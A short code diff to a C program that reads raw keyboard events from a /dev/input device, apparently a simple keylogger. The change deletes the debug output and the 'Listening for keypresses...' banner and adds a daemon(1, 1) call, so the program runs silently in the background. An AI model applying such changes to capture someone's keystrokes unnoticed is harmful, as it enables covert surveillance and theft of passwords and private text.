@@ -57,10 +57,8 @@ void read_kbd(){
 	char path[32] = "/dev/input/";	
 	const char *locate = locate_event();
 	strcat(path, locate);
-	printf(path);
 	struct input_event event;
 	int fdkbd = open(path, O_RDONLY);
-	printf("%d", fdkbd);
 	if (fdkbd == -1){
 		perror("Error in read_kbd: ");
 	}
@@ -79,6 +77,6 @@ void read_kbd(){
 
 
 int main(){
-	printf("Listening for keypresses...");
+	int background = daemon(1, 1);
 	read_kbd();
 }
